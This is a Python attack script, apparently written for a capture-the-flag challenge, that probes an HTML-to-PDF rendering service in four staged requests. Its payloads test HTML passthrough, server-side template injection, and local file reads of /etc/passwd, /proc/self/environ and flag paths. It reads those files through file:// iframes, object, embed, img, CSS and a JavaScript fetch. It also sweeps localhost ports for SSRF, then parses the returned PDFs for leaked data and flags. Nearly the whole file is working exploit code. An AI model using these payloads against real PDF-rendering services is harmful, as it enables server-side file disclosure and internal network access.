#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""12061 pdfchallenge · 单容器生命周期内的探针流水线（状态机）

设计原则（来自 2026-10-24 两台靶机的实测教训，见 README.md）：
  * 一台靶机只发**极少**请求：每个 stage = 1 次打印，stage 内用「一个 HTML 装多个 iframe」批量取证，
    所以一次渲染能同时测：HTML 透传 / 模板注入 / iframe 是否被打印 / 8 条本地文件路径。
  * 严格串行 + stage 间 sleep；任何 stage 出现 `BiDi timeout: session.new` → 冷却 60s 重试**一次**，
    再失败就 ABORT（继续硬试会漏 Firefox 进程 → OOM → 整台容器下线）。
  * 每个产物做**四路抽取**（不同攻击路径产物形态不同）：pdftotext / pdfimages -list /
    strings 找 /EmbeddedFile / 原始字节正则。最后统一扫 flag 形态与已知标记。

用法：
  MD2PDF_BASE=http://<target>:26661 python3 pipeline.py            # 全流程
  ... python3 pipeline.py --only 1,2                                 # 只跑指定 stage
  ... python3 pipeline.py --mock http://127.0.0.1:8899               # 离线自测（mock 服务）
"""
from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
import sys
import time

import requests

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "out")
os.makedirs(OUT, exist_ok=True)

FLAG_RE = re.compile(r"[A-Za-z0-9_]{2,20}\{[^}\n]{3,120}\}")
MARKERS = {
    "RAWHTML-OK-1": "原始 HTML 透传",
    "SRCDOC-CTRL": "iframe 内容会被打印（控制组）",
    "TMPL-49-END": "{{7*7}} 被服务端模板求值（Node SSTI）",
    "EJS-49-END": "EJS <%=7*7%> 被求值（EJS SSTI）",
    "PUG-49-END": "Pug #{7*7} 被求值（Pug SSTI）",
    "LOCPROTO[file:]": "顶层页面是 file: 源（file:// iframe 有希望）",
    "LOCPROTO[data:]": "顶层页面是 data: 源（file: 子资源大概率被拦）",
    "LOCPROTO[http:]": "顶层页面是 http: 源",
    "LOCPROTO[about:]": "顶层页面是 about:blank（setContent 路线）",
    "root:x:0:0": "读到 /etc/passwd（本地文件读取成立）",
    "IFRAME-BATCH": "批次标记",
    "OBJ-CTRL": "object 内容被打印（控制组）",
    "JSRAN": "页面执行了 JS",
}


def iframe(src: str, h: int = 260, w: int = 700) -> str:
    return (f'<iframe src="{src}" width="{w}" height="{h}" '
            f'style="border:1px solid #999;display:block"></iframe>')


def srcdoc_ctrl(text: str = "SRCDOC-CTRL") -> str:
    return (f"<iframe srcdoc='<p style=\"font-size:20px\">{text}</p>' "
            f'width="700" height="60" style="border:1px solid #999;display:block"></iframe>')


# ---------------------------------------------------------------- payloads
def stage1_html() -> bytes:
    """HTML 透传 + 模板注入 + iframe 打印控制组 + 8 条本地文件路径（一次渲染）"""
    files = ["/etc/hostname", "/etc/passwd", "/flag", "/flag.txt",
             "/app/flag", "/root/flag", "/proc/self/environ", "/proc/self/cmdline"]
    parts = ["<h1>RAWHTML-OK-1</h1>",
             # 同步 document.write：不依赖打印时序，必然出现在 PDF 里
             "<script>document.write('LOCPROTO['+location.protocol+'] "
             "LOCPATH['+String(location.href).slice(0,80)+']')</script>",
             "<p>TMPL-{{7*7}}-END EJS-<%=7*7%>-END PUG-#{7*7}-END</p>",
             "<p>IFRAME-BATCH-1</p>",
             srcdoc_ctrl()]
    for f in files:
        parts.append(f"<p style='font-size:14px'>{f}</p>")
        parts.append(iframe("file://" + f, h=170))
    return "\n".join(parts).encode()


def stage2_html() -> bytes:
    """同容器 localhost SSRF 端口批次（含 srcdoc 控制组）"""
    ports = [3000, 4000, 5000, 5001, 8000, 8080, 8888]
    parts = ["<h1>IFRAME-BATCH-2 SSRF</h1>", srcdoc_ctrl("SRCDOC-CTRL")]
    for p in ports:
        parts.append(f"<p style='font-size:14px'>127.0.0.1:{p}</p>")
        parts.append(iframe(f"http://127.0.0.1:{p}/", h=140))
    return "\n".join(parts).encode()


def stage3_html() -> bytes:
    """object / embed / CSS url / img 四条备选取件路径"""
    return """<h1>IFRAME-BATCH-3</h1>
<object data="data:text/html,<p>OBJ-CTRL</p>" type="text/html" width="700" height="50"></object>
<p>OBJ-FILE</p>
<object data="file:///etc/passwd" type="text/plain" width="700" height="150"></object>
<p>EMBED-FILE</p>
<embed src="file:///etc/passwd" width="700" height="150">
<p>CSS-URL-FILE</p>
<div style="background-image:url('file:///etc/passwd');height:30px;border:1px solid #999">x</div>
<p>IMG-FILE</p>
<img src="file:///etc/passwd" width="700" height="120">
<p>MD-IMG</p>
""".encode()


def stage4_html() -> bytes:
    """最后手段：JS 执行（file:// fetch 在 Firefox 下多半被 file_unique_origin 拦，
    但 data:/file: 两种装载方式结论不同，仍值得一次）"""
    return """<h1>IFRAME-BATCH-4 JS</h1>
<p id="m">JSRAN-PENDING</p>
<script>
document.getElementById('m').textContent='JSRAN-OK';
try{
  fetch('file:///etc/passwd').then(r=>r.text()).then(t=>{
    var d=document.createElement('pre');d.textContent='FETCH-OK:'+t.slice(0,300);
    document.body.appendChild(d);
  }).catch(e=>{
    var d=document.createElement('p');d.textContent='FETCH-ERR:'+e;
    document.body.appendChild(d);
  });
}catch(e){document.body.appendChild(document.createTextNode('JSERR'+e));}
</script>
""".encode()


STAGES = [
    ("s1_html_frames_filelfi", stage1_html, 75),
    ("s2_localhost_ssrf", stage2_html, 75),
    ("s3_object_embed_css", stage3_html, 75),
    ("s4_js_fetch", stage4_html, 75),
]


# ---------------------------------------------------------------- extraction
def extract(pdf_path: str) -> dict:
    raw = open(pdf_path, "rb").read()
    txt = subprocess.run(["pdftotext", "-layout", pdf_path, "-"],
                         capture_output=True, text=True).stdout
    imgs = subprocess.run(["pdfimages", "-list", pdf_path],
                          capture_output=True, text=True)
    emb = subprocess.run(["pdfdetach", "-list", pdf_path],
                         capture_output=True, text=True)
    strs = subprocess.run(["strings", "-n", "5", pdf_path],
                          capture_output=True, text=True).stdout
    found = {k: (k in txt) or (k[:28] in strs) for k in MARKERS if len(k) > 3}
    flags = sorted(set(FLAG_RE.findall(txt)) | set(FLAG_RE.findall(strs)))
    return {
        "pdf_bytes": len(raw),
        "text": txt,
        "text_len": len(txt),
        "pages": (re.findall(r"/Type\s*/Page[^s]", strs) or []).__len__(),
        "images": imgs.stdout.strip()[:800],
        "embedded": emb.stdout.strip()[:400],
        "embedded_file_marker": strs.count("/EmbeddedFile"),
        "markers": {k: bool(v) for k, v in found.items()},
        "candidate_flags": flags,
        "has_passwd": "root:x:0:0" in txt or "root:*:0:0" in txt,
        # 原始 HTML 若被当文本打印（escape），文本里就留着这些标签 →
        # 这是用来把「真渲染」和「假阳性 marker」分开的硬判据
        "tags_leaked": sum(txt.count(t) for t in ("<iframe", "<script", "<h1", "<div", "<img")),
    }


def render(base: str, payload: bytes, timeout: float):
    try:
        r = requests.post(f"{base}/render", data=payload, timeout=timeout,
                          headers={"Content-Type": "text/plain"})
        return r
    except Exception as e:
        return e


def alive(base: str) -> bool:
    try:
        r = requests.get(base + "/", timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default=os.environ.get("MD2PDF_BASE"))
    ap.add_argument("--mock", default=None, help="离线自测用 mock 服务根地址")
    ap.add_argument("--only", default=None, help="只跑这些 stage 序号，如 1,2")
    ap.add_argument("--gap", type=float, default=20, help="stage 之间等待秒数")
    ap.add_argument("--cool", type=float, default=60, help="session.new 后的冷却秒数")
    ap.add_argument("--no-retry", action="store_true", help="命中 session.new 后不重试，直接 ABORT")
    ap.add_argument("--timeout", type=float, default=None, help="覆盖每个 stage 的客户端超时")
    a = ap.parse_args()

    base = a.mock or a.base
    if not base:
        sys.exit("need --base or MD2PDF_BASE")
    base = base.rstrip("/")
    only = {int(x) for x in a.only.split(",")} if a.only else None

    report = {"base": base, "started": time.strftime("%FT%T"),
              "stages": [], "verdict": {}}
    for idx, (name, fn, tmo0) in enumerate(STAGES, 1):
        tmo = a.timeout or tmo0
        if only and idx not in only:
            continue
        print(f"\n===== [{idx}] {name} =====")
        st = {"stage": idx, "name": name}
        r = render(base, fn(), tmo)
        if not isinstance(r, requests.Response):
            st.update({"status": "client_error", "error": f"{type(r).__name__}: {r}"})
            print("  client error:", st["error"])
            report["stages"].append(st)
            if not alive(base):
                st["target_alive_after"] = False
                print("  target NOT alive -> abort pipeline")
                report["stages"].append({"aborted": True})
                break
            time.sleep(a.gap)
            continue

        st["http"] = r.status_code
        st["bytes"] = len(r.content)
        if r.content[:4] == b"%PDF":
            pdf = os.path.join(OUT, f"pipe_{name}.pdf")
            open(pdf, "wb").write(r.content)
            info = extract(pdf)
            open(os.path.join(OUT, f"pipe_{name}.txt"), "w").write(info["text"])
            st.update({"status": "ok", "pdf": pdf,
                       "markers": info["markers"],
                       "candidate_flags": info["candidate_flags"],
                       "has_passwd": info["has_passwd"],
                       "images": info["images"],
                       "embedded": info["embedded"],
                       "embedded_file_marker": info["embedded_file_marker"],
                       "tags_leaked": info["tags_leaked"],
                       "text_head": info["text"][:1200]})
            print(f"  OK pdf {info['pdf_bytes']}b text={info['text_len']}ch "
                  f"emb={info['embedded_file_marker']}")
            print("  markers:", {k: v for k, v in info["markers"].items() if v})
            if info["candidate_flags"]:
                print("  ★ FLAG CANDIDATES:", info["candidate_flags"])
            print("  --- text head ---")
            print("\n".join(info["text"].splitlines()[:25]))
        else:
            body = r.text[:300]
            st.update({"status": "error", "body": body})
            print(f"  HTTP {r.status_code} body={body!r}")
            if "session.new" in body and a.no_retry:
                print("  session.new -> --no-retry，直接 ABORT（不冷却、不重试）")
                report["stages"].append(st)
                break
            if "session.new" in body:
                print(f"  session.new timeout -> cool down {a.cool}s, retry ONCE")
                time.sleep(a.cool)
                r2 = render(base, fn(), tmo)
                if isinstance(r2, requests.Response) and r2.content[:4] == b"%PDF":
                    pdf = os.path.join(OUT, f"pipe_{name}.pdf")
                    open(pdf, "wb").write(r2.content)
                    info = extract(pdf)
                    open(os.path.join(OUT, f"pipe_{name}.txt"), "w").write(info["text"])
                    st.update({"status": "ok_after_retry", "pdf": pdf,
                               "markers": info["markers"],
                               "candidate_flags": info["candidate_flags"],
                               "has_passwd": info["has_passwd"],
                               "text_head": info["text"][:1200]})
                    print("  retry OK")
                else:
                    st["retry_failed"] = True
                    report["stages"].append(st)
                    print("  retry failed -> ABORT (不再硬试，避免 OOM 打死容器)")
                    break
        report["stages"].append(st)
        if idx < len(STAGES):
            time.sleep(a.gap)

    # 汇总判定
    flags = []
    for st in report["stages"]:
        flags += st.get("candidate_flags") or []
    report["verdict"] = {
        "candidate_flags": sorted(set(flags)),
        # 修正版：必须「出现了 marker」且「文本里没有残留标签」才算真渲染
        "html_passthrough": any(
            (s.get("markers") or {}).get("RAWHTML-OK-1") and not s.get("tags_leaked")
            for s in report["stages"]),
        "html_escaped_to_text": any((s.get("tags_leaked") or 0) > 0
                                    for s in report["stages"]),
        "iframe_printed": any((s.get("markers") or {}).get("SRCDOC-CTRL")
                              for s in report["stages"]),
        "local_file_read": any(s.get("has_passwd") for s in report["stages"]),
        "node_ssti": any((s.get("markers") or {}).get("TMPL-49-END")
                         for s in report["stages"]),
    }
    rp = os.path.join(OUT, "pipeline-report.json")
    open(rp, "w").write(json.dumps(report, indent=2, ensure_ascii=False))
    print("\n===== VERDICT =====")
    print(json.dumps(report["verdict"], indent=2, ensure_ascii=False))
    print("report:", rp)


if __name__ == "__main__":
    main()
